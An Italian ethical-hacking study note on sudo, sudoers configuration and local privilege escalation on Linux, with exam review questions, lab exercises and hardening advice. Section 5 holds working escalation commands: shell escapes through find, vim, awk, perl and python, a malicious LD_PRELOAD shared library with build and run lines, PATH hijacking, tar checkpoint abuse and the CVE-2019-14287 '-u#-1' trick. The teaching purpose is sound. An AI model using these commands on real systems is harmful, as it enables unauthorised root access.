# sudo — approfondimento (privilege escalation)

> [!info] Scopo Capire cos'è `sudo`, come decide _chi può fare cosa_ (sudoers), come tratta l'**ambiente** (la chiave di `LD_PRELOAD`/`LD_LIBRARY_PATH`), e i principali vettori di **privilege escalation** che sfruttano configurazioni deboli o bug.

Note collegate: [[ETHL 0x05 — Hacking Unix p1]] (SetUID/SetGID, `LD_PRELOAD`), [[ETHL 0x06 — Hacking Unix p2]] (cronjobs, LinPEAS, LES). Concetto prerequisito: i tre UID (real/effective/saved) — vedi sotto.

---

## 1. Cos'è `sudo` e come ottiene i privilegi

`sudo` ("**su**peruser **do**") esegue un comando **come un altro utente** (default: root), secondo le regole in `/etc/sudoers`.

Il binario `sudo` è esso stesso **SetUID-root**:

```bash
$ ls -l $(which sudo)
-rwsr-xr-x 1 root root ... /usr/bin/sudo    # la 's' = bit SetUID
```

Quando lo lanci (utente 1000), parte con `euid=0` grazie al bit SetUID. Verifica le tue autorizzazioni nei sudoers; se ok, **imposta `ruid=euid=suid=0`** (root pieno, nessun disallineamento) e poi fa `execve()` del comando target.

> [!important] Differenza chiave con il SUID "puro" Un binario SUID-root lanciato direttamente gira con `ruid=1000, euid=0` → **disallineamento**. `sudo` invece riallinea tutto a 0 prima di eseguire. Questa differenza spiega perché `LD_PRELOAD` (scartata dal linker quando c'è disallineamento) può tornare a funzionare via `sudo` (§5).

### `sudo` vs `su`

- `su utente` → avvia una **shell** come quell'utente (serve la password _di destinazione_).
- `sudo comando` → esegue **un comando** come root (serve la _tua_ password, se richiesta), in base ai sudoers.

---

## 2. sudoers — la sintassi che devi saper leggere

File: `/etc/sudoers` (+ frammenti in `/etc/sudoers.d/`). Si modifica **solo** con `visudo` (valida la sintassi: un errore può bloccarti fuori da sudo).

### Anatomia di una regola

```
utente   host = (runas_user:runas_group)   TAG:   comandi
```

|Campo|Significato|
|---|---|
|`utente`|chi può usare la regola (`%gruppo` per un gruppo)|
|`host`|su quali host vale (`ALL` ovunque)|
|`(runas_user:runas_group)`|come _chi_ può eseguire (default `root`)|
|`TAG`|es. `NOPASSWD:`, `SETENV:`|
|`comandi`|quali comandi (`ALL` = qualsiasi, o path specifici)|

### Esempi commentati

```sudoers
# alice può fare tutto come chiunque (admin pieno)
alice   ALL=(ALL:ALL) ALL

# il gruppo sudo, tutto, ma chiedendo la password
%sudo   ALL=(ALL:ALL) ALL

# bob può riavviare il servizio nginx come root, SENZA password
bob     ALL=(root) NOPASSWD: /usr/bin/systemctl restart nginx

# carol può eseguire uno script come root e SETTARE variabili d'ambiente
carol   ALL=(root) SETENV: /opt/scripts/backup.sh
```

> [!todo] Enumeration: `sudo -l` Il primo comando da lanciare su una macchina target:
> 
> ```bash
> sudo -l        # elenca cosa PUOI eseguire via sudo (e con quali tag)
> ```
> 
> Cerca: `NOPASSWD`, `SETENV`, `(ALL)`/`(root)`, comandi "abusabili" (editor, interpreti, tool con shell escape), `env_keep` con `LD_*`.

---

## 3. Quando serve la password

- Di default `sudo` chiede la **tua** password e poi memorizza un _timestamp_ (default 5 o 15 min) → non te la richiede a ogni comando.
- `NOPASSWD:` → nessuna password per quei comandi. **Oro per la privesc**: spesso lasciato per comodità su comandi pericolosi.
- `Defaults timestamp_timeout=0` → richiede sempre la password.

---

## 4. L'ambiente con `sudo` — il cuore di `LD_PRELOAD`

> [!important] Regola Di default `sudo` **non preserva** il tuo environment: usa quello pulito di root (`env_reset`). Una variabile tua sopravvive **solo se** valgono _entrambe_ le condizioni:
> 
> 1. **la specifichi** sulla command line (`sudo VAR=val cmd`, oppure `sudo -E cmd`), **AND**
> 2. **i sudoers lo consentono** (tag/Default `setenv`, oppure la var è in `env_keep`, oppure `env_reset` è disattivato).

Variabili pericolose perché controllano il caricamento di librerie: `LD_PRELOAD`, `LD_LIBRARY_PATH`.

### I knob di sudoers sull'ambiente

|Impostazione|Effetto|Rischio|
|---|---|---|
|`Defaults env_reset` (default)|azzera l'env, tiene solo una whitelist sicura|sicuro|
|`Defaults env_keep += "LD_PRELOAD"`|preserva quella var nonostante il reset|⚠️|
|`Defaults !env_reset`|disabilita il reset → passa **tutto** l'env|⚠️⚠️|
|`Defaults setenv` / tag `SETENV:`|permette di settare variabili a riga di comando / `-E`|⚠️|
|`Defaults env_delete`|blacklist di variabili da rimuovere|—|
|`Defaults secure_path=...`|forza un `PATH` sicuro per il comando|sicuro (blocca PATH hijack)|

> [!warning] Perché "a volte passa, a volte no" Non dipende dal comando che lanci, dipende da **come è configurato sudoers su quella macchina**. Se in `sudo -l` vedi `env_keep` con dentro una `LD_*`, oppure `!env_reset`, oppure un tag `SETENV:`, hai un canale per iniettare `LD_PRELOAD`.

### Perché funziona (a livello di linker)

`sudo` lancia il comando con `ruid=euid=0`: nessun disallineamento → `ld.so` **onora** `LD_PRELOAD`. Quindi il combo è:

```
1° cancello: sudo fa passare LD_PRELOAD?   (dipende da sudoers)
2° cancello: ld.so la onora?               (sì, perché ruid==euid==0)
```

---

## 5. Vettori di privilege escalation

> [!info] Principio unificante Con `sudo` finisci a girare con **EUID/EGID elevati** (root). Quindi vale tutta la superficie d'attacco del SUID/SGID: leggere/scrivere file vietati, errori insicuri, **eseguire codice**. Se riesci a eseguire _codice arbitrario_ come root in qualsiasi modo → game over.

### 5.1 Comandi con "shell escape" (stile GTFOBins)

Se i sudoers ti permettono di eseguire come root un programma che sa **lanciare una shell** o eseguire comandi, ottieni root. Esempi classici:

```bash
sudo find . -exec /bin/sh \; -quit
sudo vim -c ':!/bin/sh'              # oppure :set shell=/bin/sh poi :shell
sudo less /etc/profile               # poi  !/bin/sh
sudo awk 'BEGIN {system("/bin/sh")}'
sudo perl -e 'exec "/bin/sh";'
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo env /bin/sh
```

> [!tip] Riflesso Per _qualsiasi_ binario in `sudo -l`, cerca la sua voce su **GTFOBins** (`gtfobins.github.io`): ti dice se e come abusarne con `sudo`.

### 5.2 `LD_PRELOAD` / `LD_LIBRARY_PATH`

Possibile quando l'ambiente passa (§4). `.so` malevolo con un costruttore:

```c
#include <stdlib.h>
#include <unistd.h>
void _init() {        // o __attribute__((constructor))
    setuid(0);        // processo privilegiato → ruid=euid=suid=0
    setgid(0);
    system("/bin/sh");
}
```

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so evil.c
sudo LD_PRELOAD=/tmp/evil.so qualsiasi_comando_consentito
```

`LD_LIBRARY_PATH`: se il comando carica una libreria condivisa, punti il path a una tua copia malevola con lo stesso nome.

### 5.3 PATH hijacking

Se un comando consentito invoca un altro binario per **nome relativo** (es. lo script chiama `cat` senza path assoluto) e `secure_path` è assente/aggirabile (env passa), metti un `cat` malevolo in una dir che controlli e la anteponi al `PATH`:

```bash
echo '/bin/sh' > /tmp/cat; chmod +x /tmp/cat
sudo PATH=/tmp:$PATH /opt/scripts/foo.sh   # se sudoers lo consente
```

### 5.4 Wildcard / argomenti non vincolati

Regole con `*` o senza argomenti fissi sono pericolose:

```sudoers
bob ALL=(root) /usr/bin/tar *      # bob può passare QUALSIASI argomento a tar
```

→ `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` (abuso degli argomenti di tar).

### 5.5 Runas mal ristretto — CVE-2019-14287

Se la regola consente di eseguire come _qualsiasi utente tranne root_:

```sudoers
bob ALL=(ALL, !root) /usr/bin/id
```

il vecchio `sudo` (< ~1.8.28) trattava l'UID `-1` come `0`:

```bash
sudo -u#-1 /usr/bin/id        # → eseguito come root!
```

### 5.6 Bug di parsing — CVE-2021-3156 "Baron Samedit"

Heap buffer overflow nel parsing degli argomenti (via `sudoedit -s` con backslash finale). Sfruttabile da **qualsiasi utente locale**, _indipendentemente dai sudoers_ → root. Fixato in sudo 1.9.5p2.

### 5.7 `sudoedit` / EDITOR — CVE-2023-22809

In alcune versioni `sudoedit` permetteva di iniettare file extra da editare tramite `EDITOR`/`SUDO_EDITOR` contenenti `--`, ottenendo scrittura su file arbitrari (es. `/etc/sudoers`, `/etc/passwd`).

---

## 6. Trappole d'esame

> [!warning] Punti subdoli
> 
> - `sudo -l` **non** rivela password ma rivela la mappa completa degli abusi possibili: leggilo per primo.
> - `NOPASSWD` su un comando _qualsiasi_ con shell escape = root immediato.
> - La differenza SUID-diretto vs sudo per `LD_PRELOAD` sta nel **disallineamento UID** (linker), non in sudo "che è più permissivo".
> - `env_keep` con una `LD_*` è una falla esplicita; `!env_reset` è anche peggio.
> - `secure_path` esiste apposta per uccidere il PATH hijacking: se manca, sospetta.
> - CVE-2019-14287 richiede una regola con **negazione del runas** (`!root`), non una qualsiasi.
> - CVE-2021-3156 prescinde dai sudoers: basta poter invocare `sudoedit`.

---

## 7. Richiamo attivo — domande

> [!tip] Domande da farti
> 
> 1. Perché `sudo` permette `LD_PRELOAD` dove il SUID diretto no? _(riallinea ruid=euid=0 → linker non vede contesto SUID)_
> 2. Quali due condizioni servono perché una variabile d'ambiente raggiunga il comando? _(specificata a riga di comando + consentita dai sudoers)_
> 3. Cosa cerchi nell'output di `sudo -l`? _(NOPASSWD, SETENV, env_keep LD__, comandi con shell escape, runas (ALL))*
> 4. Perché `Defaults secure_path` blocca il PATH hijacking? _(forza un PATH sicuro, ignora il tuo)_
> 5. Quando si applica CVE-2019-14287? _(regola runas con `!root`; trucco `-u#-1`)_

---

## 8. Difese / hardening (lato blue team)

- Mantieni `Defaults env_reset` e **non** aggiungere `LD_*` a `env_keep`.
- Imposta `Defaults secure_path` a una lista minima e fidata.
- Evita regole con `ALL`, wildcard `*`, e comandi con shell escape; vincola **argomenti** e usa path assoluti.
- Preferisci `NOPASSWD` solo dove strettamente necessario, su comandi non abusabili.
- Tieni `sudo` aggiornato (i bug 2019/2021/2023 si chiudono con le patch).
- Logga e monitora (`/var/log/auth.log`, `journalctl`); valuta `Defaults log_input,log_output`.

---

## 9. Sfide / esercizi

- [ ] Su una VM di lab, crea una regola `NOPASSWD` su `find`/`vim`/`less` e ottieni root via shell escape.
- [ ] Configura `env_keep += LD_PRELOAD`, compila l'`.so` malevolo del §5.2 e verifica la shell root.
- [ ] Rompi e poi sistema una regola `tar *` (wildcard abuse) → poi vincola gli argomenti.
- [ ] Riproduci CVE-2019-14287 con `(ALL, !root)` su una versione vulnerabile di sudo.
- [ ] Confronta `sudo -l` con e senza `secure_path` e prova un PATH hijack.

---

## 10. Link

- `gtfobins.github.io` — catalogo di shell escape per sudo/SUID
- `man sudoers` (sezione _Command environment_, _SUDOERS OPTIONS_)
- `man sudo` (flag `-l`, `-E`, `-u`)
- CVE-2019-14287 (runas `-1`), CVE-2021-3156 (Baron Samedit), CVE-2023-22809 (sudoedit)
- Note collegate: [[ETHL 0x05 — Hacking Unix p1]] · [[ETHL 0x06 — Hacking Unix p2]]